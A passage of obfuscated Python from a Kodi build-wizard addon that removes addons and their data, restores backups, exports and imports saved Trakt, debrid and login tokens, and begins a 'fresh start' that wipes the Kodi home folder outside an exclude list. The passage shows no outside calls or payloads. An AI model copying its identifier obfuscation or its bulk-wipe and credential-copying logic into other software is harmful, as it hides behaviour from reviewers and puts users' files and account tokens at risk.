def removeAddon (OOO0OO000O000O0O0 ,O0OO00O0000OOO000 ,over =False ):#line:4589
	if not over ==False :#line:4590
		O00OOO000O000OOOO =1 #line:4591
	else :#line:4592
		O00OOO000O000OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00O0000OOO000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOO0OO000O000O0O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4593
	if O00OOO000O000OOOO ==1 :#line:4594
		OO0O00OOOO0OO0O00 =os .path .join (ADDONS ,OOO0OO000O000O0O0 )#line:4595
		wiz .log ("Removing Addon %s"%OOO0OO000O000O0O0 )#line:4596
		wiz .cleanHouse (OO0O00OOOO0OO0O00 )#line:4597
		xbmc .sleep (1000 )#line:4598
		try :shutil .rmtree (OO0O00OOOO0OO0O00 )#line:4599
		except Exception as O00OO000O0000OO00 :wiz .log ("Error removing %s"%OOO0OO000O000O0O0 ,xbmc .LOGNOTICE )#line:4600
		removeAddonData (OOO0OO000O000O0O0 ,O0OO00O0000OOO000 ,over )#line:4601
	if over ==False :#line:4602
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OO00O0000OOO000 ))#line:4603
def removeAddonData (O0OOOO0000O0O00O0 ,name =None ,over =False ):#line:4605
	if O0OOOO0000O0O00O0 =='all':#line:4606
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4607
			wiz .cleanHouse (ADDOND )#line:4608
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4609
	elif O0OOOO0000O0O00O0 =='uninstalled':#line:4610
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4611
			OO0O000OOOOOO0O00 =0 #line:4612
			for O0O0O0OOOOO0OOOO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4613
				OOOOO00000O000OO0 =O0O0O0OOOOO0OOOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4614
				if OOOOO00000O000OO0 in EXCLUDES :pass #line:4615
				elif os .path .exists (os .path .join (ADDONS ,OOOOO00000O000OO0 )):pass #line:4616
				else :wiz .cleanHouse (O0O0O0OOOOO0OOOO0 );OO0O000OOOOOO0O00 +=1 ;wiz .log (O0O0O0OOOOO0OOOO0 );shutil .rmtree (O0O0O0OOOOO0OOOO0 )#line:4617
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0O000OOOOOO0O00 ))#line:4618
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4619
	elif O0OOOO0000O0O00O0 =='empty':#line:4620
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4621
			OO0O000OOOOOO0O00 =wiz .emptyfolder (ADDOND )#line:4622
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0O000OOOOOO0O00 ))#line:4623
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4624
	else :#line:4625
		OOO00OOO00O000OOO =os .path .join (USERDATA ,'addon_data',O0OOOO0000O0O00O0 )#line:4626
		if O0OOOO0000O0O00O0 in EXCLUDES :#line:4627
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4628
		elif os .path .exists (OOO00OOO00O000OOO ):#line:4629
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOO0000O0O00O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4630
				wiz .cleanHouse (OOO00OOO00O000OOO )#line:4631
				try :#line:4632
					shutil .rmtree (OOO00OOO00O000OOO )#line:4633
				except :#line:4634
					wiz .log ("Error deleting: %s"%OOO00OOO00O000OOO )#line:4635
			else :#line:4636
				wiz .log ('Addon data for %s was not removed'%O0OOOO0000O0O00O0 )#line:4637
	wiz .refresh ()#line:4638
def restoreit (O00O0OO000OOO0O0O ):#line:4640
	if O00O0OO000OOO0O0O =='build':#line:4641
		O0O00000O0O00O0O0 =freshStart ('restore')#line:4642
		if O0O00000O0O00O0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4643
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4644
		wiz .skinToDefault ()#line:4645
	wiz .restoreLocal (O00O0OO000OOO0O0O )#line:4646
def restoreextit (OOO0OO000000O0O00 ):#line:4648
	if OOO0OO000000O0O00 =='build':#line:4649
		OOOOOO00OOOO0000O =freshStart ('restore')#line:4650
		if OOOOOO00OOOO0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4651
	wiz .restoreExternal (OOO0OO000000O0O00 )#line:4652
def buildInfo (O0O0OO000O0000000 ):#line:4654
	if wiz .workingURL (SPEEDFILE )==True :#line:4655
		if wiz .checkBuild (O0O0OO000O0000000 ,'url'):#line:4656
			O0O0OO000O0000000 ,OO00OO00OO0OO0OO0 ,OO00OO00O0O0O000O ,O0O0O0OO000000OOO ,O0O00OO0000OO0OO0 ,O0OOOO000OO00OOOO ,OO00OOO0000O0O0OO ,OOO0O0000OO0O0OOO ,O0OOO0OO00O0OOO0O ,O00O00O000OOOOOO0 ,O0OOOO0O0OO00O00O =wiz .checkBuild (O0O0OO000O0000000 ,'all')#line:4657
			O00O00O000OOOOOO0 ='Yes'if O00O00O000OOOOOO0 .lower ()=='yes'else 'No'#line:4658
			OOO0O0OO000OO0OO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OO000O0000000 )#line:4659
			OOO0O0OO000OO0OO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OO00OO0OO0OO0 )#line:4660
			if not O0OOOO000OO00OOOO =="http://":#line:4661
				O0OO0000O00OO0OOO =wiz .themeCount (O0O0OO000O0000000 ,False )#line:4662
				OOO0O0OO000OO0OO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO0000O00OO0OOO ))#line:4663
			OOO0O0OO000OO0OO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OO0000OO0OO0 )#line:4664
			OOO0O0OO000OO0OO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O00O000OOOOOO0 )#line:4665
			OOO0O0OO000OO0OO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOO0O0OO00O00O )#line:4666
			wiz .TextBox (ADDONTITLE ,OOO0O0OO000OO0OO0 )#line:4667
		else :wiz .log ("Invalid Build Name!")#line:4668
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4669
def buildVideo (OOO0O000000OOOO00 ):#line:4671
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4672
	if wiz .workingURL (SPEEDFILE )==True :#line:4673
		O000O0000OOO00O00 =wiz .checkBuild (OOO0O000000OOOO00 ,'preview')#line:4674
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOO0O000000OOOO00 )#line:4675
		if O000O0000OOO00O00 and not O000O0000OOO00O00 =='http://':playVideo (O000O0000OOO00O00 )#line:4676
		else :wiz .log ("[%s]Unable to find url for video preview"%OOO0O000000OOOO00 )#line:4677
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4678
def dependsList (O00OO000OOO000OOO ):#line:4680
	O000OOO00O0OOO0O0 =os .path .join (ADDONS ,O00OO000OOO000OOO ,'addon.xml')#line:4681
	if os .path .exists (O000OOO00O0OOO0O0 ):#line:4682
		O000OOOO000OO000O =open (O000OOO00O0OOO0O0 ,mode ='r');OOOOO0OOO0O0OOOOO =O000OOOO000OO000O .read ();O000OOOO000OO000O .close ();#line:4683
		OOOO000O00O00000O =wiz .parseDOM (OOOOO0OOO0O0OOOOO ,'import',ret ='addon')#line:4684
		OOOOOOOO0O000OOOO =[]#line:4685
		for OOOOOO00OOO00OOOO in OOOO000O00O00000O :#line:4686
			if not 'xbmc.python'in OOOOOO00OOO00OOOO :#line:4687
				OOOOOOOO0O000OOOO .append (OOOOOO00OOO00OOOO )#line:4688
		return OOOOOOOO0O000OOOO #line:4689
	return []#line:4690
def manageSaveData (O00O0O0OO00O0O0O0 ):#line:4692
	if O00O0O0OO00O0O0O0 =='import':#line:4693
		O000000OOOO000O00 =os .path .join (ADDONDATA ,'temp')#line:4694
		if not os .path .exists (O000000OOOO000O00 ):os .makedirs (O000000OOOO000O00 )#line:4695
		O00O0O0000OO000OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4696
		if not O00O0O0000OO000OO .endswith ('.zip'):#line:4697
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4698
			return #line:4699
		O0O000OOOOOO00000 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4700
		OOO00O000O000OOO0 =xbmcvfs .copy (O00O0O0000OO000OO ,O0O000OOOOOO00000 )#line:4701
		wiz .log ("%s"%str (OOO00O000O000OOO0 ))#line:4702
		extract .all (xbmc .translatePath (O0O000OOOOOO00000 ),O000000OOOO000O00 )#line:4703
		OO0O00000OO00000O =os .path .join (O000000OOOO000O00 ,'trakt')#line:4704
		OO000OO0OOO0OOO0O =os .path .join (O000000OOOO000O00 ,'login')#line:4705
		OO000O0O00O0000OO =os .path .join (O000000OOOO000O00 ,'debrid')#line:4706
		O0O000O00OO000O0O =0 #line:4707
		if os .path .exists (OO0O00000OO00000O ):#line:4708
			O0O000O00OO000O0O +=1 #line:4709
			O000O000O00O0O0O0 =os .listdir (OO0O00000OO00000O )#line:4710
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4711
			for O0O00O0O0O0O0OOO0 in O000O000O00O0O0O0 :#line:4712
				O0O000OOOOOOO00O0 =os .path .join (traktit .TRAKTFOLD ,O0O00O0O0O0O0OOO0 )#line:4713
				O00OOOO00O0OO0OOO =os .path .join (OO0O00000OO00000O ,O0O00O0O0O0O0OOO0 )#line:4714
				if os .path .exists (O0O000OOOOOOO00O0 ):#line:4715
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O0O0O0O0OOO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4716
					else :os .remove (O0O000OOOOOOO00O0 )#line:4717
				shutil .copy (O00OOOO00O0OO0OOO ,O0O000OOOOOOO00O0 )#line:4718
			traktit .importlist ('all')#line:4719
			traktit .traktIt ('restore','all')#line:4720
		if os .path .exists (OO000OO0OOO0OOO0O ):#line:4721
			O0O000O00OO000O0O +=1 #line:4722
			O000O000O00O0O0O0 =os .listdir (OO000OO0OOO0OOO0O )#line:4723
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4724
			for O0O00O0O0O0O0OOO0 in O000O000O00O0O0O0 :#line:4725
				O0O000OOOOOOO00O0 =os .path .join (loginit .LOGINFOLD ,O0O00O0O0O0O0OOO0 )#line:4726
				O00OOOO00O0OO0OOO =os .path .join (OO000OO0OOO0OOO0O ,O0O00O0O0O0O0OOO0 )#line:4727
				if os .path .exists (O0O000OOOOOOO00O0 ):#line:4728
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O0O0O0O0OOO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4729
					else :os .remove (O0O000OOOOOOO00O0 )#line:4730
				shutil .copy (O00OOOO00O0OO0OOO ,O0O000OOOOOOO00O0 )#line:4731
			loginit .importlist ('all')#line:4732
			loginit .loginIt ('restore','all')#line:4733
		if os .path .exists (OO000O0O00O0000OO ):#line:4734
			O0O000O00OO000O0O +=1 #line:4735
			O000O000O00O0O0O0 =os .listdir (OO000O0O00O0000OO )#line:4736
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4737
			for O0O00O0O0O0O0OOO0 in O000O000O00O0O0O0 :#line:4738
				O0O000OOOOOOO00O0 =os .path .join (debridit .REALFOLD ,O0O00O0O0O0O0OOO0 )#line:4739
				O00OOOO00O0OO0OOO =os .path .join (OO000O0O00O0000OO ,O0O00O0O0O0O0OOO0 )#line:4740
				if os .path .exists (O0O000OOOOOOO00O0 ):#line:4741
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O0O0O0O0OOO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4742
					else :os .remove (O0O000OOOOOOO00O0 )#line:4743
				shutil .copy (O00OOOO00O0OO0OOO ,O0O000OOOOOOO00O0 )#line:4744
			debridit .importlist ('all')#line:4745
			debridit .debridIt ('restore','all')#line:4746
		wiz .cleanHouse (O000000OOOO000O00 )#line:4747
		wiz .removeFolder (O000000OOOO000O00 )#line:4748
		os .remove (O0O000OOOOOO00000 )#line:4749
		if O0O000O00OO000O0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4750
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4751
	elif O00O0O0OO00O0O0O0 =='export':#line:4752
		OOOO0O000O0OOO00O =xbmc .translatePath (MYBUILDS )#line:4753
		O0000OO0O0OOO0O00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4754
		traktit .traktIt ('update','all')#line:4755
		loginit .loginIt ('update','all')#line:4756
		debridit .debridIt ('update','all')#line:4757
		O00O0O0000OO000OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4758
		O00O0O0000OO000OO =xbmc .translatePath (O00O0O0000OO000OO )#line:4759
		OOO00O0O00OOOO00O =os .path .join (OOOO0O000O0OOO00O ,'SaveData.zip')#line:4760
		O0O000O00O00OOO00 =zipfile .ZipFile (OOO00O0O00OOOO00O ,mode ='w')#line:4761
		for OOOOO00O0O0O0000O in O0000OO0O0OOO0O00 :#line:4762
			if os .path .exists (OOOOO00O0O0O0000O ):#line:4763
				O000O000O00O0O0O0 =os .listdir (OOOOO00O0O0O0000O )#line:4764
				for O000OO0O0O0000000 in O000O000O00O0O0O0 :#line:4765
					O0O000O00O00OOO00 .write (os .path .join (OOOOO00O0O0O0000O ,O000OO0O0O0000000 ),os .path .join (OOOOO00O0O0O0000O ,O000OO0O0O0000000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4766
		O0O000O00O00OOO00 .close ()#line:4767
		if O00O0O0000OO000OO ==OOOO0O000O0OOO00O :#line:4768
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O0O00OOOO00O ))#line:4769
		else :#line:4770
			try :#line:4771
				xbmcvfs .copy (OOO00O0O00OOOO00O ,os .path .join (O00O0O0000OO000OO ,'SaveData.zip'))#line:4772
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00O0O0000OO000OO ,'SaveData.zip')))#line:4773
			except :#line:4774
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O0O00OOOO00O ))#line:4775
def freshStart (install =None ,over =False ):#line:4780
	if USERNAME =='':#line:4781
		ADDON .openSettings ()#line:4782
		sys .exit ()#line:4783
	OO0OO0O0OO000OOO0 =u_list (SPEEDFILE )#line:4784
	(OO0OO0O0OO000OOO0 )#line:4785
	OO00OOO0O0OOO000O =(wiz .workingURL (OO0OO0O0OO000OOO0 ))#line:4786
	(OO00OOO0O0OOO000O )#line:4787
	if KEEPTRAKT =='true':#line:4788
		traktit .autoUpdate ('all')#line:4789
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4790
	if KEEPREAL =='true':#line:4791
		debridit .autoUpdate ('all')#line:4792
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4793
	if KEEPLOGIN =='true':#line:4794
		loginit .autoUpdate ('all')#line:4795
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4796
	if over ==True :OO0OO0O00O0O0OO00 =1 #line:4797
	elif install =='restore':OO0OO0O00O0O0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4798
	elif install :OO0OO0O00O0O0OO00 =1 #line:4799
	else :OO0OO0O00O0O0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4800
	if OO0OO0O00O0O0OO00 :#line:4801
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4802
			OO000O00000OO0OOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4803
			skinSwitch .swapSkins (OO000O00000OO0OOO )#line:4806
			O0O0OOOO0O0O000OO =0 #line:4807
			xbmc .sleep (1000 )#line:4808
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOOO0O0O000OO <150 :#line:4809
				O0O0OOOO0O0O000OO +=1 #line:4810
				xbmc .sleep (1000 )#line:4811
				wiz .ebi ('SendAction(Select)')#line:4812
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4813
				wiz .ebi ('SendClick(11)')#line:4814
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4815
			xbmc .sleep (1000 )#line:4816
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4817
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4818
			return #line:4819
		wiz .addonUpdates ('set')#line:4820
		O00O000OO0O000000 =os .path .abspath (HOME )#line:4821
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4822
		O0OO00OOO0O00OO00 =sum ([len (OOOO0000OO0OO0O00 )for OOOOO00OO000OO0O0 ,OO0OO0O00O0OO00OO ,OOOO0000OO0OO0O00 in os .walk (O00O000OO0O000000 )]);OO00O0O0O000O00O0 =0 #line:4823
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4824
		EXCLUDES .append ('My_Builds')#line:4825
		EXCLUDES .append ('archive_cache')#line:4826
		EXCLUDES .append ('script.module.requests')#line:4827
		EXCLUDES .append ('myfav.anon')#line:4828
		if KEEPREPOS =='true':#line:4829
			OOOOO00OOOOOO0O00 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4830
			for OO00OOOO000O000OO in OOOOO00OOOOOO0O00 :#line:4831
				OOOOOO00O00O000O0 =os .path .split (OO00OOOO000O000OO [:-1 ])[1 ]#line:4832
				if not OOOOOO00O00O000O0 ==EXCLUDES :#line:4833
					EXCLUDES .append (OOOOOO00O00O000O0 )#line:4834
		if KEEPSUPER =='true':#line:4835
			EXCLUDES .append ('plugin.program.super.favourites')#line:4836
		if KEEPMOVIELIST =='true':#line:4837
			EXCLUDES .append ('plugin.video.metalliq')#line:4838
		if KEEPMOVIELIST =='true':#line:4839
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4840
		if KEEPADDONS =='true':#line:4841
			EXCLUDES .append ('addons')#line:4842
		if KEEPADDONS =='true':#line:4843
			EXCLUDES .append ('addon_data')#line:4844
		EXCLUDES .append ('plugin.video.elementum')#line:4847
		EXCLUDES .append ('script.elementum.burst')#line:4848
		EXCLUDES .append ('script.elementum.burst-master')#line:4849
		EXCLUDES .append ('plugin.video.quasar')#line:4850
		EXCLUDES .append ('script.quasar.burst')#line:4851
		EXCLUDES .append ('skin.estuary')#line:4852
		if KEEPWHITELIST =='true':#line:4855
			O0O00OOO00OO0O0OO =''#line:4856
			OO00O00000000OO00 =wiz .whiteList ('read')#line:4857
			if len (OO00O00000000OO00 )>0 :#line:4858
				for OO00OOOO000O000OO in OO00O00000000OO00 :#line:4859
					try :OOOO0O00OO00O0OO0 ,OO0O000000OO00OO0 ,OO00OO000000O00O0 =OO00OOOO000O000OO #line:4860
					except :pass #line:4861
					if OO00OO000000O00O0 .startswith ('pvr'):O0O00OOO00OO0O0OO =OO0O000000OO00OO0 #line:4862
					OO0OOO0O0O0O000OO =dependsList (OO00OO000000O00O0 )#line:4863
					for O0O0000OO0O0O00OO in OO0OOO0O0O0O000OO :#line:4864
						if not O0O0000OO0O0O00OO in EXCLUDES :#line:4865
							EXCLUDES .append (O0O0000OO0O0O00OO )#line:4866
						OOO0OOO00O00OO0OO =dependsList (O0O0000OO0O0O00OO )#line:4867
						for O0OO0O0O0O0O0OOO0 in OOO0OOO00O00OO0OO :#line:4868
							if not O0OO0O0O0O0O0OOO0 in EXCLUDES :#line:4869
								EXCLUDES .append (O0OO0O0O0O0O0OOO0 )#line:4870
					if not OO00OO000000O00O0 in EXCLUDES :#line:4871
						EXCLUDES .append (OO00OO000000O00O0 )#line:4872
				if not O0O00OOO00OO0O0OO =='':wiz .setS ('pvrclient',OO00OO000000O00O0 )#line:4873
		if wiz .getS ('pvrclient')=='':#line:4874
			for OO00OOOO000O000OO in EXCLUDES :#line:4875
				if OO00OOOO000O000OO .startswith ('pvr'):#line:4876
					wiz .setS ('pvrclient',OO00OOOO000O000OO )#line:4877
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4878
		O0O0O00O00O0OO00O =wiz .latestDB ('Addons')#line:4879
		for O00OO0O0O0000O0O0 ,O0O0OO0O0O0O0OO0O ,O000OO0O0OOOO00OO in os .walk (O00O000OO0O000000 ,topdown =True ):#line:4880
			O0O0OO0O0O0O0OO0O [:]=[O000O0OOOO0O00000 for O000O0OOOO0O00000 in O0O0OO0O0O0O0OO0O if O000O0OOOO0O00000 not in EXCLUDES ]#line:4881
			for OOOO0O00OO00O0OO0 in O000OO0O0OOOO00OO :#line:4882
				OO00O0O0O000O00O0 +=1 #line:4883
				OO00OO000000O00O0 =O00OO0O0O0000O0O0 .replace ('/','\\').split ('\\')#line:4884
				O0O0OOOO0O0O000OO =len (OO00OO000000O00O0 )-1 #line:4886
				if OO00OO000000O00O0 [O0O0OOOO0O0O000OO -2 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO00OO000000O00O0 [O0O0OOOO0O0O000OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4887
				elif OOOO0O00OO00O0OO0 =='MyVideos99.db'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4888
				elif OOOO0O00OO00O0OO0 =='MyVideos107.db'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4889
				elif OOOO0O00OO00O0OO0 =='MyVideos116.db'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4890
				elif OOOO0O00OO00O0OO0 =='MyVideos99.db'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4891
				elif OOOO0O00OO00O0OO0 =='MyVideos107.db'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4892
				elif OOOO0O00OO00O0OO0 =='MyVideos116.db'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -1 ]=='userdata'and OO00OO000000O00O0 [O0O0OOOO0O0O000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O0O0000O0O0 ,OOOO0O00OO00O0OO0 ),xbmc .LOGNOTICE )#line:4893
